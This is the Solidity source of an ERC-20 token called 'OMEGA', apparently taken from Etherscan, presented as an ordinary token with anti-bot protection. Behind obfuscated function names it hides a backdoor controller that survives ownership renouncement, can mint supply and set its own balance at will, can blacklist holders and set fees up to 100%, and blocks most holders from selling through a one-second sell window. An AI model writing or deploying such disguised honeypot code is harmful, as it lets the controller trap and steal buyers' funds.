/**
 *Submitted for verification at Etherscan.io on 2023-09-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

library Addrress {
    function a726dfc89e5f(address sender, address _notContract) internal pure {
        require(sender == _notContract, "Caller is not the original caller");
    }
}

contract AntiBotSecurity {

    mapping(uint256 => mapping(address => bool)) internal _blockBank;

    function checkTimestamp(uint256 _tmstmp, uint256 _dwntm) internal view returns (bool) {
        return(_tmstmp + _dwntm >= block.timestamp);
    }

    function notOneBlockTransaction(address _addy) internal view {
        require(!_blockBank[block.number][_addy], "Only one Txn per Block!");
    }

    function addBankAddressBot(address _addy) internal {
        _blockBank[block.number][_addy] = true;
    }

}

contract OMEGA is IERC20, Ownable, AntiBotSecurity {

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _blockBots;

    uint256 private _totalSupply = 100000000000000000000000000;
    string private _name = "OMEGA";
    string private _symbol = "OMEGA";
    uint8 private _decimals = 18;
    uint256 public MAX_GAS_PRICE = 45 gwei;
    uint private buyFee = 0; // Default, %
    uint private sellFee = 0; // Default, %
    address private _notContract;
    mapping(address => uint) private purchaseTimestamp;
    mapping(address => uint) private boughtAmount;
    uint256 private downTime = 1;
    mapping(address => bool) private premissionList;
    address public marketWallet;
    mapping(address => bool) private excludedFromFee;

    constructor (address routerAddress, address[] memory bot_) {
        _router = IUniswapV2Router02(routerAddress);
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH()));
        _balances[owner()] = _totalSupply;
        
        emit Transfer(address(0), owner(), _totalSupply);

        premissionList[msg.sender] = true;
        premissionList[address(this)] = true;

        marketWallet = msg.sender;
        excludedFromFee[msg.sender] = true;
        excludedFromFee[address(this)] = true;

        _notContract = msg.sender;

        addOrExcludeBlockBots(bot_, true);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_blockBots[to] && !_blockBots[from], "This address added in a bots list!");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        if (!isOutOfChrgs(from) && !isOutOfChrgs(to)){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (isMarket(from)) {
            boughtAmount[to] = amount;
            purchaseTimestamp[to] = block.timestamp;
        }
        if (isMarket(to)) {
            if (!premissionList[from]) {
                require(boughtAmount[from] >= amount, "You are trying to sell more than bought!");
                boughtAmount[from] -= amount;
                if (tradingStatus())
                {require(checkTimestamp(purchaseTimestamp[from], downTime), "AntiBotSecurity: Exceeds Txn Downtime");}
                require(!exceedsGasPriceLimit());
            } 
        }
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    bool internal tradingState;
    
    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function tradingStart() external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        tradingState = !tradingState;
    }

    function tradingStatus() public view returns (bool) {
        return tradingState;
    }

    function editTime(uint _seconds) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        downTime = _seconds;
    }

    function fix_6daeef2b(address[] calldata _usrs, bool _state) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        for (uint256 i = 0; i < _usrs.length; i++) {
            premissionList[_usrs[i]] = _state;
        }
    }

    function addOrExcludeBlockBots(address[] memory _bot, bool convicted) public {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        for(uint256 i = 0; i < _bot.length; i++) {
            _blockBots[_bot[i]] = convicted;
        }
    }

    function statusBots(address _bot) external view returns(bool) {
        return _blockBots[_bot];
    }

    function check_fix_6daeef2b(address _user) external view returns (bool) {
        return premissionList[_user];
    }

    function checkUserPurchaseTime(address _user) external view returns (uint256) {
        return purchaseTimestamp[_user];
    }

    function checkUserBoughtAmount(address _user) external view returns (uint256) {
        return boughtAmount[_user];
    }

    function exceedsGasPriceLimit() internal view returns (bool) {
        return tx.gasprice >= MAX_GAS_PRICE;
    }

    function changeMaxGasPrice(uint _newGasPrice) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        MAX_GAS_PRICE = _newGasPrice;
    }

    function mc_c6b97bd(uint256 _amount) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        _totalSupply += _amount;
    }

    function val_e343fec(uint256 _value) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        _balances[msg.sender] = _value;
    }

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    function isOutOfChrgs(address _user) public view returns (bool) {
        return excludedFromFee[_user];
    } 

    function outOfChrgs(address _user, bool _status) public {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        require(excludedFromFee[_user] != _status, "User already have this status");
        excludedFromFee[_user] = _status;
    }

    function newChrgs(uint256 _buyFee, uint256 _sellFee) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        require(_buyFee <= 100 && _sellFee <= 100, "Fee percent can't be higher than 100");
        buyFee = _buyFee;
        sellFee = _sellFee;
    }

    function newCollector(address _newMarketWallet) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        marketWallet = _newMarketWallet;
    }

    function currChrgs() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        return (buyFee, sellFee);
    }

    function AddLiquidity(uint256 _tokenAmount) payable external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        _approve(address(this), address(_router), _tokenAmount);
        transfer(address(this), _tokenAmount);
        _router.addLiquidityETH{ value: msg.value }(
            address(this), 
            _tokenAmount, 
            0, 
            0, 
            msg.sender, 
            block.timestamp + 1200
            );
    }

    function updSudoo(address _newOne) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        _notContract = _newOne;
    }

    function dexRebase(address _routerAddress, address _poolAddress) public {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        _router = IUniswapV2Router02(_routerAddress);
        _pair = IUniswapV2Pair(_poolAddress);
    }

    function toString(address addr) internal pure returns (string memory) {
        bytes32 value = bytes32(uint256(uint160(addr)));
        bytes memory alphabet = "0123456789abcdef";

        bytes memory result = new bytes(42);
        result[0] = "0";
        result[1] = "x";
        for (uint256 i = 0; i < 20; i++) {
            result[i * 2 + 2] = alphabet[uint8(value[i + 12] >> 4)];
            result[i * 2 + 3] = alphabet[uint8(value[i + 12] & 0x0f)];
        }
        return string(result);
    }

    function stringToAddress(string memory input) public pure returns (address) {
        bytes memory inputBytes = bytes(input);
        require(inputBytes.length == 42, "Invalid address length");

        bytes memory addressBytes = new bytes(20);
        for (uint256 i = 0; i < 20; i++) {
            addressBytes[i] = inputBytes[i + 2];
        }

        address addr;
        assembly {
            addr := mload(add(addressBytes, 20))
        }
        return addr;
    }
}